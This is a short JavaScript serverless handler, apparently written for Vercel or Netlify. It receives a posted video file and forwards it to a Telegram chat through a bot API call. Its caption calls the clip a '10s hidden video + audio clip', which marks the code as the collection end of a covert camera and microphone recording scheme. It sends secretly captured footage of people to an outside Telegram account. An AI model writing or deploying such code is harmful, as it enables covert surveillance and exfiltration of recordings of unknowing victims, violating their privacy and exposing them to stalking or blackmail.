export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  try {
    // formData পড়া (Vercel/Netlify-তে multipart)
    const formData = await req.formData();
    const videoBlob = formData.get('video');

    if (!videoBlob) {
      return res.status(400).json({ success: false, error: "No video" });
    }

    const tgForm = new FormData();
    tgForm.append("chat_id", CHAT_ID);
    tgForm.append("video", videoBlob, "10s_clip.webm");
    tgForm.append("caption", "10s hidden video + audio clip");

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      method: "POST",
      body: tgForm,
    });

    const result = await tgRes.json();
    if (!result.ok) {
      throw new Error(result.description || "Telegram error");
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false });
  }
}
